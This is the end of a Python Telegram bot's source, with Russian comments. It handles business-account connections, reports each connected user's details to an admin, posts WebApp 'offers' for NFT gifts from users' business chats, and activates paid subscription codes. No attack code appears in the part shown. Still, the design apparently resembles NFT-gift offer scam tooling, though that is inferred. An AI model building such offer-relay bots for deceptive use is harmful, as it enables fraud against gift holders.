                ADMIN_ID,
                f"🔗 Аккаунт подключён\n\n"
                f"ID: <code>{uid}</code>\n"
                f"Username: {uname}\n"
                f"Имя: {html_escape(bc.user.full_name or '')}\n"
                f"Может отвечать: {'да' if bc.can_reply else 'нет'}",
            )
        except Exception:
            pass
        # DM юзеру через бизнес-чат если можно
        if bc.can_reply:
            try:
                await bot.send_message(
                    uid,
                    "✅ Бот подключён к аккаунту.\n\n"
                    "Теперь офферы будут приходить через бизнес-чат.",
                )
            except Exception:
                pass
    else:
        BUSINESS_CONNECTIONS.pop(uid, None)
        log.info(f"business disconnected: uid={uid}")
        try:
            await bot.send_message(
                ADMIN_ID,
                f"🔗 Аккаунт отключён\n\nID: <code>{uid}</code>",
            )
        except Exception:
            pass


# ── Сообщения в бизнес-чатах ───────────────────────────────
@dp.business_message()
async def on_business_message(message: Message):
    """Обработка сообщений в бизнес-чатах (подключённые аккаунты).

    Формат оффера: ссылка сумма [g]
    Пример: t.me/nft/SwissWatch-1350 100 g
    """
    user = message.from_user
    biz_id = getattr(message, "business_connection_id", None)
    if user:
        _track_user(user.id, user.username)
    # Проверяем оффер-команду (ссылка сумма [g])
    o = parse_cmd(message.text, user.id if user else 0)
    if o:
        ts = int(time.time())
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                text=offer_text(o, ts),
                reply_markup=offer_kb(o, ts),
                link_preview_options=lp(o["nft_url"]),
                business_connection_id=biz_id,
            )
        except Exception as e:
            log.warning(f"biz offer send fail: {e}")
            # фолбэк без WebApp
            try:
                await bot.send_message(
                    chat_id=message.chat.id,
                    text=offer_text(o, ts),
                    reply_markup=offer_kb_fallback(o, ts),
                    link_preview_options=lp(o["nft_url"]),
                    business_connection_id=biz_id,
                )
            except Exception as e2:
                log.warning(f"biz offer fallback fail: {e2}")
        return
    # Активация кода в бизнес-чате
    text = (message.text or "").strip()
    if re.match(r"^[A-Za-z0-9]{14}$", text) and text in ACTIVATION_CODES:
        uname, expires = ACTIVATION_CODES[text]
        if time.time() < expires and user:
            SUBSCRIPTIONS[user.id] = (uname, expires)
            _save_data()
            try:
                await bot.send_message(
                    chat_id=message.chat.id,
                    text="✅ Подписка активирована.",
                    business_connection_id=biz_id,
                )
            except Exception:
                pass
            log.info(f"biz: subscription activated uid={user.id} code={text}")


async def main():
    # Graceful shutdown при SIGTERM (Render посылает перед убийством инстанса)
    loop = asyncio.get_event_loop()
    for sig in (signal.SIGTERM, signal.SIGINT):
        loop.add_signal_handler(sig, lambda: asyncio.create_task(_shutdown()))

    await bot.delete_webhook(drop_pending_updates=True)
    await bot.set_my_commands([BotCommand(command="start", description="Запустить")])
    me = await bot.get_me()
    log.info(f"bot: @{me.username} id={me.id} (stateless)")
    try:
        await dp.start_polling(
            bot,
            allowed_updates=[
                "message", "callback_query",
                "inline_query",
                "business_connection", "business_message",
            ],
        )
    except Exception as e:
        if "conflict" in str(e).lower():
            log.error(f"Conflict detected, exiting: {e}")
            sys.exit(1)
        raise


async def _shutdown():
    log.info("Shutdown signal received, stopping...")
    await dp.stop_polling()
    await bot.session.close()
    sys.exit(0)


if __name__ == "__main__":
    asyncio.run(main())
